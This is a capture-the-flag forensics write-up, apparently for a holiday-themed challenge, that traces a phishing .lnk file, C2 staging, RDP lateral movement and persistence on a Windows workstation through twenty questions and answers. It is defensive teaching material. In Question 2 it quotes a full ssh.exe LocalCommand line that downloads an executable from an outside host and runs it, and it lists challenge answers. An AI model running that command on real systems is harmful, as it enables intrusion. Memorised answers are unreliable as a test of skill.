# **OpTinselTrace24-1 Sneaky Cookies Writeup**
![image](https://github.com/user-attachments/assets/cddeec66-577e-4e30-99a6-371270a69f03)

Krampus, the cyber threat actor, infiltrated Santa Workshop's digital infrastructure. After last year’s incident, Santa notified the team to be aware of social engineering and instructed the sysadmin to secure the environment. Bingle Jollybeard, who is an app developer and will be workinremotely from the South Pole, was visiting the workshop to set up his system for remote access. His workstation was mysteriously compromised and potentially paved the way for Krampus to wreck chaos again this season. Figure out what happened using the artifacts provided by the beachhead host.

**Tools:**
- Registry explorer
- Timeline Explorer
- bmc-tools
- SrumECmd
**Learned:**
- Timeline Analysis
- RDP Forensics
- Lateral Movement Analysis
- Static Malware Analysis
- C2 Framework Analysis

Initial analysis we are given a drive image.
### **Question 1**
Krampus, a notorious threat actor, possibly social-engineered bingle as email security filters were offline for maintenance. Find any suspicious files under Bingle Jollybeard User directory and get back to us with the full file name

	I took to the users NTUSER.dat hiev as this shows user specific configs and settings. I saw the christmas_slab.pdf but the target location was using another program to get the stager of the malware installed

	In this registry key, Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU. I found the file that the user opened and I thought it was a double extension of some sort because the original I found was wrong which made me think it was a double extension

![image](https://github.com/user-attachments/assets/29ec4893-6994-4081-8dd3-ab286a53bc94)

**Answer:** christmas_slab.pdf.lnk
### **Question 2**
Using the malicious file sent as part of phishing, the attacker abused a legitimate binary to download and execute a C&C stager. What is the full command used to download and execute the C&C Binary?

	Under the documents direcotry I found the 'christmas_slab.pdf' whose icon was an executeable which didn't look right. Opening up the properties I can see it is abusing a legitmate binary ssh.exe to establish a connection

![image](https://github.com/user-attachments/assets/82f378ca-787c-4127-b093-f1ca3facea68)

**Answer:** C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "StrictHostKeyChecking=no" -o "LocalCommand=scp root@17.43.12.31:/home/revenge/christmas-sale.exe c:\users\public\. && c:\users\public\christmas-sale.exe" revenge@17.43.12.31
### **Question 3**
When was this file ran on the system by the victim?

	Pay attention to the command we found in the last question. We can see it runs christmas-sale.exe not the .pdf file. I used the prefetch files to find its last runtime and used PECmd to assist me

![image](https://github.com/user-attachments/assets/77145957-13e5-493c-96fd-d5b69f7d7968)

**Answer:** 2024-11-05 15:50:33
### **Question 4**
What is the Mitre Sub technique ID for the technique used in Q1 and Q2 ?

	Lets review what we have observed. First, we noticed they used a double extension where the masked what the true intentions of the program are. Next, the target location was used to remotely download the actual malware. The use of ssh.exe in this context is what lead me to Mitre ID sub tech: [User Execution: Malicious File, Sub-technique T1204.002: Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1204/002/)

**Answer:** T1204.002
### **Question 5**
What was the name of threat actor's machine used to develop/create the malicious file sent as part of phishing?

	Doing some OSINT on the binary and strings on the machine I was able to find the machine hostname

![image](https://github.com/user-attachments/assets/8816ecac-057c-4c71-b038-c00df9a1ceb5)

**Answer:** christmas-destr
### **Question 6**
When did attacker enumerated the running processes on the system?

	So, since I am not seeing any powershell history, we werent given a pcap file which I would expect nmap or maybe metasploitable use. I suspect they used something native on the Windows system so by going to the PF files I found tasklist.exe which shows all the running task on a given system at that time is how they enumerated it

![image](https://github.com/user-attachments/assets/08e3c337-05c1-460b-a74a-4905266286bf)

**Answer:** 2024-11-05 15:52:30
### **Question 7**
After establishing a C&C Channel, attacker proceeded to abuse another Legitimate binary to download an exe file. What is the full URI for this download?

	So they used a Lolbin to download the file. Thinking about some of the LoLBin that can do this like wget or bitsadmin are some I think of. If I want to confirm my suspicion I will go back to the prefetch files. I did find that bitsadmin.exe was ran 

![image](https://github.com/user-attachments/assets/495a1019-e8fd-45bc-8f08-da3b10389171)

	Confirming that I will look towards event logs to further investigate more specificaly the bit client. Filtering on event ID 59 you will find when the job executes successfully and it will show you the link that was used but in our case this shows the C2 channel it is establishing a connection with

![image](https://github.com/user-attachments/assets/abe7a49e-8de2-4654-9939-cbc7f323dd2e)

**Answer:** http://13.233.149.250/candies/candydandy.exe 
### **Question 8**
What is the Mitre ID for the technique used in Q7?

	At this point we understand they used a BITS job to establish the connection which thru a quick google search is Mitre ID T1197

**Answer:** T1197
### **Question 9**
In the workshop environment, RDP was only allowed internally. It is suspected that the threat actor stole the VPN configuration file for Bingle Jolly Beard, connected to the VPN, and then connected to Bingle's workstation via RDP. When did they first authenticate and successfully connect to Bingle's Workstation?

	I understand up to this point that the rdp config was saved on their desktop and looking at the logon username it was "northpole-nippy". Its important to remmeber to consider the timeline analysis for the events we have answers for thus far. Therefore, I suspect shortly after they ran the file and established the connection I suspect/think they rdp'd shortly after

	Filtering on events of 4624 in the security logs there were hundreds but I narrowed down my search results to a logon type of 10 which would've indicated RDP was used to logon. Nothing came back

	Doing further research I learned about the remote connection manager logs for terminal services which sholw events related to the remote desktop service. The reason I thought this would be good detail is it can tell me when the service started which could hint at this is when the attacker RDP'd in just by doing timeline analysis. Filtering on event 1149 which is when a RDP connection was attempted which this timeframe lines up with the intrusion timeline we have gathered thus far

![image](https://github.com/user-attachments/assets/a14e5e1a-3681-4c24-9f75-111099858261)

**Answer:** 2024-11-05 16:04:26
### **Question 10**
Any IOC's we find are critical to understand the scope of the incident. What is the hostname of attacker's machine making the RDP connection?

	In the event log details from the previous question the domain is the computer name from which made the connection

![image](https://github.com/user-attachments/assets/9d993087-9819-4146-80e6-d75112151b54)

**Answer:**  XMAS-DESTROYER
### **Question 11**
What is md5 hash of the file downloaded in Q7?

	Given we know the stager was executed to setup the C2 communicationw hich dropped that file. In the prefetch file I was able to find the executable. 

![image](https://github.com/user-attachments/assets/d898b061-02ff-4bc9-be85-6c9b4444b623)

	From here I leveraged my notes an used the amcache registry hive which shows all evidence of execution as well as the hashes. After using Amcache parser from EZ tool suite I was able to find the executable and the product of the file. The reason the product is important is this is what the actual file is and its mimikatz renamed. From there I went to VT and serched mimikatz hash since its a known tool

![image](https://github.com/user-attachments/assets/4e0e8dc1-d6c8-4f70-8869-75d8954cb39d)

**Answer:** e930b05efe23891d19bc354a4209be3e
### **Question 12**
Determine the total amount of traffic in KBs during the C&C control communication from the stager executable.

	Christmas-sale.exe was the stager therefore I filtered on that. I saw the received and sent traffic. Add those together which is 541286 / 1000 which is 541.286

![image](https://github.com/user-attachments/assets/66177d44-e70a-4d0a-a755-293805ea8ca2)

**Answer:** 541.286
### **Question 13**
As part of persistence, the attacker added a new user account to the Workstation and granted them higher privileges. What is the name of this account?

	I will look in the security event log for 4720 which indicates a new account. Was able to find the account that was created

![image](https://github.com/user-attachments/assets/1ec97960-bd7d-43c7-a572-6a52dcfa3762)

**Answer:** elfdesksupport
### **Question 14**
After completely compromising Bingle's workstation, the Attacker moved laterally to another system. What is the full username used to login to the system?

	So help identify lateral movement using the HKCU registry file and filter on the terminal server client key it will help me in my investigation. I was able to find one entry and looking at the timestamp and continuing my timeline analysis it aligns with what we have been investigating

![image](https://github.com/user-attachments/assets/61af1714-1029-4884-ad2a-8ca115e1256c)

**Answer:** northpole-nippy\nippy
### **Question 15**
According to the remote desktop event logs, what time did the attack successfully move laterally?

	From the registry key for RDP we can see the last modified which is when it was last used keying in on when they moved laterally
	
![image](https://github.com/user-attachments/assets/0a404d2f-8661-45c6-9948-bd74de117f12)

**Answer:** 2024-11-05 16:22:36
### **Question 16**
After moving to the other system, the attacker downloaded an executable from an open directory hosted on their infrastructure. What are the two staging folders named?

	I had to do some research and learned about bitmap cache. I learned that when you make a connection via rdp it stores that nifo locally on your machine. It is a small image but is enough to tell on you

	Using bmc-tools, I will leverage this tool to help me parse the cache file from our users RDP sessions. Going to this file path: C:\Users\Bingle Jollybeard\AppData\Local\Microsoft\Terminal Server Client\Cache we will take the cache files there and extract the info we need

	From the bitmap cahche I can see there was an open directory on 

![image](https://github.com/user-attachments/assets/f67bdd2d-5e46-4626-98d1-e24fb1c1fccc)

	Furthering along I could see the directories from the picture

![image](https://github.com/user-attachments/assets/02f0888c-447c-4d5c-b694-be062eae00ec)

**Answer:** candies,sweets
### **Question 17**
What is the name of the downloaded executable downloaded from the open directory?

	I found this picture of an executable named cookies.exe was removed and in another pic of the bitmap cache I could see as if it was moved somewhere

![image](https://github.com/user-attachments/assets/c0e40776-0d69-49f4-aace-a963f62b0810)

**Answer:** cookies.exe
### **Question 18**
After downloading the executable from Q17, the attacker utilized the exe to be added as a persistence capability. What is the name they gave to this persistence task?

	This took some time but I had to manually go through each one. I was looking at the run keys of everything and I came across this one which from when I was looking at the run keys I saw them altering this looked close but was the answer
	
![image](https://github.com/user-attachments/assets/9f1b21c9-f784-4b42-ab11-5b3f22138bbf)

**Answer:** christmaseve_gift
### **Question 19**
To further aid in internal reconnaissance, the threat actor downloads a well-known tool from the Vendor's website. What is the name of this tool?

	Looking at the bitmap cache files I saw the advanced IP scanner through several of the pictures

![image](https://github.com/user-attachments/assets/90bc6ea3-6aed-4a9b-8d2c-52598f07f352)

**Answer:** advanced IP scanner
### **Question 20**
Determine the total amount of traffic in KBs during the internal lateral movement, which originated from Bingle's workstation to the other machine in the network.

	mstsc.exe is the known exe for RDP sessions therefore, going back to the SRUMDB file I will add together the bytes received and sent. Adding those 2 together 16397521 / 1000 = 16397.521

![image](https://github.com/user-attachments/assets/65718fe4-5e1a-44bd-bd02-41b5e5ed3b56)

**Answer:** 16397.521

